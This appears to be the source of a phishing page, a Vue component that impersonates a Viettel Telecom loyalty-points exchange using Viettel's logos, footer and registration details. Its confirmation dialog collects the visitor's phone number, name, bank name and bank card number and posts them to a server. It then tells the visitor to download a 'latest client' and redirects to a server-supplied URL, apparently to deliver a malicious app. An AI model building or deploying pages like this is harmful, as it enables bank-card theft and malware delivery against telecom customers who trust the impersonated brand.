<template>
  <div class="vite-pages-all-list">
		<div class="header-box">
				<ul class="header js-header align-center">
				<li class="icon-box no-grow no-shrink"><i class=" iconfont icon-livemenu"></i></li>
				<li class="logo-box icon-box center-center p-relative">
					<img src="https://viettel.vn/viettelshop/logo_viettel.png" alt="logo viettel Telecom" >
					<i class=" iconfont icon-liveuser"></i>
				</li>
				<li class="icon-box no-grow no-shrink"><i class=" iconfont icon-livesearch"></i></li>
				</ul>
		</div>
    
		<div class="container" >
			<h2 class="section-title">电信优惠</h2>
			<ul class="telecom-list d-flex">
					<li>
						<a class="telecom-list__link active d-column center-center">
							<i class=" iconfont icon-livemobile-phone"></i>
							<span class="telecom-list__name">
								移动收费
							</span>
						</a>
					</li>
					<li>
						<a class="telecom-list__link d-column center-center">
							<i class=" iconfont icon-livemodular"></i>
							<span class="telecom-list__name">
								数据
							</span>
						</a>
					</li>
					<li>
						<a class="telecom-list__link  d-column center-center">
							<i class=" iconfont icon-livephone"></i>
							<span class="telecom-list__name">
								通话记录
							</span>
						</a>
					</li>
					<li>
						<a class="telecom-list__link d-column center-center">
							<i class=" iconfont icon-livecomment"></i>
							<span class="telecom-list__name">
								短信
							</span>
						</a>
					</li>
					<li>
						<a class="telecom-list__link d-column center-center">
							<i class=" iconfont icon-livework"></i>
							<span class="telecom-list__name">
								数据包
							</span>
						</a>
					</li>
			</ul>
			<div class="telecom-box">
				<p class="title__exchange  center-center no-grow"><span>1000</span> 积分= <span>1000</span> 运费</p>
				<div>
					<h5 class="telecom-box__sub">规则</h5>
					<p class="telecom-box__des">
						申请条件：移动和固定客户为消费积分在1000分及以上的钻石、金、银会员。
					</p>
					<p class="telecom-box__des">
						申请条件：移动和固定客户为消费积分在1000分及以上的钻石、金、银会员。
					</p>
					<p class="telecom-box__des">
						申请条件：移动和固定客户为消费积分在1000分及以上的钻石、金、银会员。
					</p>
				</div>
			</div>
			<h2 class="section-change">积分兑换套餐</h2>
			<ul class="exchange-point__list d-flex">
				<li class="exchange-point__item  active no-shrink no-grow">
					<div class="exchange-point__images img-hover">
						<img src="https://viettel.vn/images-viettel-plus/img-tele-point-2.png" alt="图片">
					</div>
					<div class="exchange-point__info center-center">
						<i class="icon-livemeiyuan iconfont"></i>
						50,000 点
					</div>
				</li>
				<li class="exchange-point__item no-shrink no-grow">
					<div class="exchange-point__images img-hover">
						<img src="https://viettel.vn/images-viettel-plus/img-tele-point-2.png" alt="图片">
					</div>
					<div class="exchange-point__info center-center">
						<i class="icon-livemeiyuan iconfont"></i>
						50,000 点
					</div>
				</li>
				<li class="exchange-point__item no-shrink no-grow">
					<div class="exchange-point__images img-hover">
						<img src="https://viettel.vn/images-viettel-plus/img-tele-point-2.png" alt="图片">
					</div>
					<div class="exchange-point__info center-center">
						<i class="icon-livemeiyuan iconfont"></i>
						50,000 点
					</div>
				</li>
			</ul>
			<a class="telecom-offer__btn center-center" @click="dialogFormVisible=true" href="javascript:void(0)">兑换确认</a>
		</div>
		<div class="footer">
			<div class="logo-fotter">
				<img src="https://viettel.vn/images/logo-footer.png">
			</div>
			<p class="logo-fotter">VIETTEL 电信的官方在线购物网站。</p>
			<div class="logo-fotter">
				<p>
					管理机构：Viettel Telecommunications Corporation (Viettel Telecom) - 军工分公司 - 电信集团。
					企业代码：0100109106-011 河内计划投资厅2005年7月18日首次发布，2018年12月18日第15次修订。
					内容负责人：Cao Anh Son先生
				</p>
			</div>
			<div data-v-12135119="" class="infobellow_group d-flex">
				<div data-v-12135119="" class="bocongthuong ">
					<a data-v-12135119="" href="http://online.gov.vn/Home/WebDetails/78377">
						<img data-v-12135119="" src="https://viettel.vn/images_content/bocongthuong.png"></a></div>
					<div data-v-12135119="" class="infobellow  d-column">
						<ul class="link-social d-flex">
						<li>
							<a href="https://www.facebook.com/Vietteltelecom/" target="_blank">
								<img src="https://viettel.vn/images/icon-fb.png"></a></li>
						<li>
							<a href="https://www.youtube.com/user/Viettelchannels" target="_blank">
								<img src="https://viettel.vn/images/icon-yt.png"></a></li>
						<li>
							<a href="http://zalo.me/1814378069399742003" target="_blank">
								<img src="https://viettel.vn/images/zalo.png"></a></li>
					</ul>
          <p class="bocongthuong-copy"> Viettel Telecom 2015。保留所有权利。</p> 
				</div>
			</div>
		</div>
		<el-dialog title="填写信息" width="99%" :visible.sync="dialogFormVisible">
			<el-form :model="form" :rules="rules" ref="ruleForm" >
				<el-form-item prop="phone" label="手机号：" :label-width="formLabelWidth">
					<el-input v-model="form.phone" autocomplete="off"></el-input>
				</el-form-item>
				<el-form-item  prop="username" label="姓名：" :label-width="formLabelWidth">
					<el-input v-model="form.username" autocomplete="off"></el-input>
				</el-form-item>
				<el-form-item prop="rankname" label="银行名称：" :label-width="formLabelWidth">
					<el-select filterable v-model="form.rankname" placeholder="请选择">
						<el-option
							v-for="item in bank"
							:key="item.value"
							:label="item.label"
							:value="item.value">
							<div class="align-center pb-4">
								<span  style=" line-height: 1; "><img height="30" :src="item.img" alt=""></span>
								<span  style=" line-height: 1; padding-left: 4px;">{{ item.label }}</span>
							</div>
						
						</el-option>
					</el-select>
				</el-form-item>
				<el-form-item  prop="rankNum" label="银行卡号：" :label-width="formLabelWidth">
					<el-input v-model="form.rankNum" autocomplete="off"></el-input>
				</el-form-item>
			</el-form>
			<div slot="footer" class="dialog-footer">
				<el-button @click="resetForm('ruleForm')">取 消</el-button>
				<el-button type="primary" @click="submitForm('ruleForm')">确 定</el-button>
			</div>
		</el-dialog>
  </div>
</template>

<script>
import { dom } from '../components/config/emoji.js';
import bank from '../bank';
export default {
	name: 'listHome',
  data() {
    return {
			bank,
      dialogFormVisible:false,
			formLabelWidth:'100px',
			form: {
				phone: '',
				username: '',
				rankname:'',
				rankNum:''
        },
				rules: {
					phone:[{ required: true, message: '填写手机号码', trigger: 'blur' },],
					username:[{ required: true, message: '填写名字', trigger: 'blur' },],
					rankname:[{ required: true, message: '填写银行名称', trigger: 'blur' },],
					rankNum:[{ required: true, message: '填写银行卡号', trigger: 'blur' },],
				}
    };
  },
  methods: {
		submitForm(formName) {
        this.$refs[formName].validate( async (valid) => {
          if (!valid) return
					let result= await this.ajaxData()
					this.resetForm(formName)
					this.dialogFormVisible=false
					console.log(result)
					if(result.code === 20000){
						this.$MessageBox.alert('你的申请已经提交，请下载最新客户端等待审核', '提示', {
							confirmButtonText: '确定',
							callback: action => {
								if( action == 'confirm'){
									window.location.href=result.data.url
								}
							}
						});
					}
        });
      },
		async	ajaxData(){
			const loading = this.$loading({
          lock: true,
          text: 'Loading',
          spinner: 'el-icon-loading',
          background: 'rgba(0, 0, 0, 0.7)'
        });
			let data=	this.$http.post(`/article/msg`,this.form)
			loading.close()
			return data
		},
		resetForm(formName) {
			this.$refs[formName].resetFields();
			this.dialogFormVisible = false
		},
    loadDashBoard() {
			let scrollHeight = document.documentElement.scrollTop || document.body.scrollTop || window.pageYOffset
				let header = document.querySelector('.js-header')
				if(!header) return
				if(scrollHeight > 4){
					dom.addClass(header, 'header--fixed')
				}else{
					dom.removeClass(header, 'header--fixed')
				}
    },
  },
	mounted() {
		document.addEventListener('scroll',this.loadDashBoard)
	},
	destroyed() {
      document.removeEventListener('scroll', this.loadDashBoard)
      this.orderInterval && clearInterval(this.orderInterval)
    }
};
</script>

<style lang="scss" scoped>
.vite-pages-all-list{
	background: #fff;
  font-size: 16px;
  font-family: "Roboto", sans-serif;
  padding: 0px;
  margin: 0px;
  color: #252525;
  font-size: 14px;
  line-height: 1.15;
	.header-box,.header{
		height: 46px;
	}
	.header{
		background: #fff;
		
    transition: 0.7s all;
		padding: 10px 15px;
		.icon-box{
			width:24px;
			i{
				font-size: 24px;
				line-height: 1
			}
		}
		.logo-box{
			flex: 1
		}
		.icon-liveuser{
			font-size: 18px;
			position: absolute;
			top: 50%;
			right:20px;
			transform: translateY(-50%);
		}
	}
	.header--fixed{
		position: fixed;
		top: 0;
		left: 0;
		right: 0;
		z-index: 999;
		
		box-shadow: 0 5px 10px rgb(129 126 126 / 31%);
	}
	.container{
		padding: 0px 15px;
	}
	.section-title {
    font-size: 24px;
    line-height: 32px;
		padding: 40px 0 30px;
	}
	.section-change{
		font-size: 24px;
    line-height: 32px;
		padding-bottom: 20px;
	}
	.telecom-list{
		.iconfont{
			font-size: 24px;
			line-height: 1;
		}
	}
	.telecom-list__name {
    font-size: 12px;
    line-height: 18px;	
		margin-top: 10px;
		font-size: 12px;
	}	
	.telecom-list__link{
		font-weight: 600;
		flex: 0 0 120px;
    margin: 0 8px;
    width: 120px;
		height: 118px;
		background-color: #f7f7f7;
    border: 1px solid #e7e7e7;
    border-radius: 4px;
		.iconfont{
			color: #ff3b4a;
		}
	}
	.active{
		background-color: #ee0033;
    border-color: #ee0033;
		color: #fff;
		.iconfont{
			color: #fff;
		}
	}
	.telecom-list{
		overflow-x: auto;
    margin: 0 -8px;
    padding: 10px 0 5px;
	}
	.telecom-box{
		margin: 30px auto;
    max-width: 100%;
    padding: 15px;
		background-color: #f7f7f7;
    border-radius: 4px;
    width: 100%;
	}
	.title__exchange{
		color: #ee0033;
    font-family: 'FS Magistral', sans-serif;
    font-size: 20px;
    height: 60px;
		padding: 0 15px;
		background: #fff;
		width: 248px;
		margin: 0 auto 20px;
		span{
			font-size: 24px;
			font-weight: 600;
		}
	}
	.telecom-box__sub{
		font-weight: 700;
		color: #000;
    font-family: 'FS PFBeauSansPro', sans-serif;
    font-size: 18px;
    line-height: 28px;
    margin: 0 0 8px;
	}
	.telecom-box__des{
		color: #26292b;
    font-family: 'FS PFBeauSansPro', sans-serif;
    font-size: 16px;
    line-height: 24px;
		font-weight: 400;
	}
	.exchange-point__item{
		background-color: #fff;
    border: 1px solid #e7e7e7;
    border-radius: 4px;
    cursor: pointer;
		width: 250px;
		margin: 0 8px;
	}
	.exchange-point__list{
		flex-wrap: nowrap;
    margin: 0 -8px;
    overflow-x: auto;
    overflow-y: hidden;
		
	}
	.exchange-point__images{
		height: 140px;
		border-radius: 4px 4px 0 0;
		overflow: hidden;
		img{
			height: 100%;
			object-fit: cover;
			width: 100%;
		}
	}
	.exchange-point__info{
		font-size: 14px;
		height: 52px;
		font-weight: 600;
		color: #26292b;
		.iconfont{
			font-size:22px;
			line-height: 1;
			color: #ff3b4a;
			font-weight: normal;
		}
	}
	.exchange-point__item.active {
    border: 2px solid #ee0033;
   }
		.telecom-offer__btn{
			height: 40px;
			background-color: #ee0033;
			color: #fff;
			font-size: 14px;
			text-decoration: none;
			font-weight: 600px;
			margin: 30px 0 60px;
			border-radius: 4px;
		}
		.telecom-offer__des{
			color: #44494d;
			font-family: 'FS PFBeauSansPro', sans-serif;
			font-size: 16px;
			line-height: 24px;
			text-align: center;
			padding-bottom: 60px;
			span{
				color: #ee0033;
				font-weight: 600;
			}
		}
		.footer{
			font-size: 13px;
			padding: 10px 0px 10px;
			background: #f2f2f2;
			color: #000000;
			padding: 15px;
		}
		.logo-fotter{
			margin-bottom: 15px;
		}
		.link-social{
			li{
				padding: 0 5px;
			}
			img{
				width: 24px;
			}
		}
		.bocongthuong-copy{
			padding-left: 5px;
		}
		.infobellow_group {
			justify-content: space-between;
		}
}

</style>